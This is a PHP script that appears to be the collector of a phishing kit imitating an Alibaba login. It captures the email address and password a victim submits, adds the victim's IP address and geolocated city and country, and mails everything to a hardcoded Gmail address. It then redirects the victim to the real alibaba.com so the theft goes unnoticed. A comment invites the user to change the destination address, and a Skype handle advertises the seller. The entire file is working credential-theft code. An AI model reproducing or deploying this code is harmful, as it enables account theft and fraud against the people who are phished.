<?php
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

if($_POST["g"] != "" and $_POST["f"] != ""){
$message .= "++++++++++++++++++THE EMAIL++++++++++++++++++++\n";
$message .= "EMAIL: ".$_POST['g']."\n";
$message .= "PASS: ".$_POST['f']."\n";
$message .= "++++Add Me on Skype: osayande22 to Do Links++++\n";
$message .= "\n";
$message .= "\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "+++++++++++++++Skype: osayande22++++++++++++++\n";
//change ur email here
$sent ="genuinebrandz@gmail.com";

$subject = "Ali Log from $ip";
$headers = "From: ALI<customer@ali.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

	mail($sent,$subject,$message,$headers);
    header("Location: http://alibaba.com");
    exit;
    
}

?>